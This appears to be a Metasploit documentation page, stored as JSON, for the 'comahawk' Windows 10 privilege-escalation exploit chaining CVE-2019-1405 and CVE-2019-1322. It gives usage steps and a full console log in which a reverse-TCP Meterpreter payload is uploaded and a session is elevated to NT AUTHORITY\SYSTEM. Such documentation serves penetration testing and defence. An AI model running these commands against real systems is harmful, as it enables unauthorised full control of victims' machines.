{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/comahawk","result":{"data":{"moduleMetadataJson":{"id":"9642bc47-f3b6-5eb8-a1e9-46fee04c0aac","name":"Microsoft UPnP Local Privilege Elevation Vulnerability","fullname":"exploit/windows/local/comahawk","description":"This exploit uses two vulnerabilities to execute a command as an elevated user.\n      The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to\n      NT AUTHORITY\\LOCAL SERVICE\n      The second (CVE-2019-1322) leverages the Update Orchestrator Service to\n      elevate from NT AUTHORITY\\LOCAL SERVICE to NT AUTHORITY\\SYSTEM.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/comahawk","documentationSlug":"/modules/documentation/exploit/windows/local/comahawk"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This leverages two vulnerabilities on specific builds of Windows 10 to\nmove from an authenticated user of any level to NT AUTHORITY\\LOCAL SERVICE\nand then from NT AUTHORITY\\LOCAL SERVICE to NT AUTHORITY\\SYSTEM.\nThe first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to\nNT AUTHORITY\\LOCAL SERVICE\nThe second (CVE-2019-1322) leverages the Update Orchestrator Service to\nelevate from NT AUTHORITY\\LOCAL SERVICE to NT AUTHORITY\\SYSTEM.</p>\n<p>The exploit works by creating a new service, so the exploit may take\nup to minute on test systems, and may take longer in the wild.  Adjusting\nthe exploit_timeout value in the datastore.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<ol>\n<li>Create a session on the target system under the context of an authenticated user.</li>\n<li>Begin interacting with the module: <code class=\"language-text\">use exploit/windows/local/comahawk</code>.</li>\n<li>Set the <code class=\"language-text\">PAYLOAD</code> and configure it correctly.</li>\n<li>If an existing handler is configured to receive the elevated session, then the module's\nhandler should be disabled: <code class=\"language-text\">set DisablePayloadHandler true</code>.</li>\n<li>Make sure that the <code class=\"language-text\">SESSION</code> value is set to the existing session identifier.</li>\n<li>Invoke the module: <code class=\"language-text\">run</code>.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-100-build-17134-x64\" style=\"position:relative;\"><a href=\"#windows-10-100-build-17134-x64\" aria-label=\"windows 10 100 build 17134 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 (10.0 Build 17134) x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Meterpreter session 1 opened (192.168.135.168:5555 -&gt; 192.168.132.125:49674) at 2019-12-11 18:33:09 -0600\n\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-D1E425Q\nOS              : Windows 10 (10.0 Build 17134).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: DESKTOP-D1E425Q\\msfuser\nmeterpreter &gt; getsystem\n[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; use exploit/windows/local/comahawk \nmsf5 exploit(windows/local/comahawk) &gt; set versbose true\nversbose =&gt; true\nmsf5 exploit(windows/local/comahawk) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/comahawk) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/comahawk) &gt; set lhost 192.168.135.168\nlhost =&gt; 192.168.135.168\nmsf5 exploit(windows/local/comahawk) &gt; show options\n\nModule options (exploit/windows/local/comahawk):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   EXECUTE_DELAY    3                yes       The number of seconds to delay between file upload and exploit launch\n   EXPLOIT_NAME                      no        The filename to use for the exploit binary (%RAND% by default).\n   EXPLOIT_TIMEOUT  60               yes       The number of seconds to wait for exploit to finish running\n   PAYLOAD_NAME                      no        The filename for the payload to be used on the target host (%RAND%.exe by default).\n   SESSION          1                yes       The session to run this module on.\n   WRITABLE_DIR                      no        Path to write binaries (%TEMP% by default).\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.135.168  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x64\n\n\nmsf5 exploit(windows/local/comahawk) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.168:4444 \n[*] Attempting to PrivEsc on DESKTOP-D1E425Q via session ID: 1\n[*] Exploit uploaded on DESKTOP-D1E425Q to C:\\Users\\msfuser\\AppData\\Local\\Temp\\TcpHnwmv.exe\n[*] Payload (7168 bytes) uploaded on DESKTOP-D1E425Q to C:\\Users\\msfuser\\AppData\\Local\\Temp\\EubQLoJJbPMX.exe\n[*] It may take a moment after the session is established for the exploit to exit safely.\n[*] Sending stage (206403 bytes) to 192.168.132.125\n[*] Meterpreter session 2 opened (192.168.135.168:4444 -&gt; 192.168.132.125:49679) at 2019-12-11 18:35:35 -0600\n\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-D1E425Q\nOS              : Windows 10 (10.0 Build 17134).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9642bc47-f3b6-5eb8-a1e9-46fee04c0aac"}}}